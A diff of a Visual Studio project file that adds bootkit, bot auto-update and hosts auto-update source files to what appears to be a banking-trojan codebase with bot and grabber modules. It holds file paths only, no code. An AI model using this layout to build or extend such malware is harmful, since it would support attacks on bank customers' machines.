@@ -456,6 +456,14 @@
 				>
 			</File>
 			<File
+				RelativePath="..\..\source\RuBnk\bootkit.h"
+				>
+			</File>
+			<File
+				RelativePath="..\..\source\Common\BotAutoUpdate.h"
+				>
+			</File>
+			<File
 				RelativePath="..\..\Source\Core\BotClasses.h"
 				>
 			</File>
@@ -577,6 +585,10 @@
 			</File>
 			<File
 				RelativePath="..\..\Source\Misc\Grabber.h"
+				>
+			</File>
+			<File
+				RelativePath="..\..\source\Common\HostsAutoUpdate.h"
 				>
 			</File>
 			<File
@@ -772,6 +784,14 @@
 				>
 			</File>
 			<File
+				RelativePath="..\..\source\RuBnk\bootkit.cpp"
+				>
+			</File>
+			<File
+				RelativePath="..\..\source\Common\BotAutoUpdate.cpp"
+				>
+			</File>
+			<File
 				RelativePath="..\..\Source\Core\BotClasses.cpp"
 				>
 			</File>
@@ -893,6 +913,10 @@
 			</File>
 			<File
 				RelativePath="..\..\Source\Misc\Grabber.cpp"
+				>
+			</File>
+			<File
+				RelativePath="..\..\source\Common\HostsAutoUpdate.cpp"
 				>
 			</File>
 			<File
